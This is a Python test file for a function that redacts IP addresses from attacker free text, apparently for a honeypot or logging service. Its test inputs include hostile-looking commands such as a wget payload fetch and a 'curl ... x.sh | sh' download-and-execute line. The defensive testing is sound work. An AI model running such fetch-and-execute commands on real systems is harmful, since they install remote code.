"""IP redaction for attacker free text (mirror of the frontend redactIps tests)."""

import re

from src.services.redact import IP_BLOT, redact_ips

_DOTTED_QUAD = re.compile(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")


def test_redacts_ipv4_in_command() -> None:
    assert redact_ips("wget http://34.11.136.102/meow") == "wget http://‹ip›/meow"


def test_redacts_https_ipv4_with_port() -> None:
    out = redact_ips("curl https://185.220.101.5:8080/x.sh | sh")
    assert out == "curl https://‹ip›:8080/x.sh | sh"
    assert not _DOTTED_QUAD.search(out)


def test_redacts_ipv6_forms() -> None:
    assert redact_ips("ping 2001:db8::1").count("‹ip›") == 1
    assert "2001:db8" not in redact_ips("wget https://[2001:db8::1]/x")
    # Embedded-v4, bracketed and unbracketed: no dotted-quad tail survives.
    assert not _DOTTED_QUAD.search(redact_ips("route 2001:db8::1.2.3.4 via"))
    assert not _DOTTED_QUAD.search(redact_ips("wget https://2001:db8::1.2.3.4/p"))


def test_redacts_alternate_encoded_hosts() -> None:
    assert redact_ips("wget http://2130706433/bin") == "wget http://‹ip›/bin"
    assert redact_ips("curl http://0x7f000001/a") == "curl http://‹ip›/a"
    assert redact_ips("wget http://0177.0.0.1/x") == "wget http://‹ip›/x"


def test_does_not_touch_domains_or_version_strings() -> None:
    assert (
        redact_ips("wget https://example.com/clean") == "wget https://example.com/clean"
    )
    assert redact_ips("lib.so.1.2.3.4.5") == "lib.so.1.2.3.4.5"
    assert redact_ips("chmod 777 x; 13:41:49") == "chmod 777 x; 13:41:49"


def test_idempotent_and_none_passthrough() -> None:
    once = redact_ips("get http://1.2.3.4/x")
    assert redact_ips(once) == once  # already blotted -> unchanged
    assert redact_ips(None) is None
    assert IP_BLOT == "‹ip›"
